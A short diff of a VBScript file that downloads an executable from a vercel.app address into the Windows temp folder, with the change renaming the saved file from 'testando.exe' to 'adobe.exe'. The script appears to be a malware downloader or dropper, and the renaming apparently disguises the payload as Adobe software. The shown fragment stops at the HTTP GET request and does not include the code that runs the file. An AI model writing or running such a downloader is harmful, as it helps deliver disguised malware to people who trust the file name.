@@ -3,7 +3,7 @@ Option Explicit
 Dim urlExe, destinoExe, http, stream
 
 urlExe = "https://testando123-blond.vercel.app/adobe.exe"
-destinoExe = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\testando.exe"
+destinoExe = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\adobe.exe"
 
 Set http = CreateObject("MSXML2.XMLHTTP")
 http.Open "GET", urlExe, False
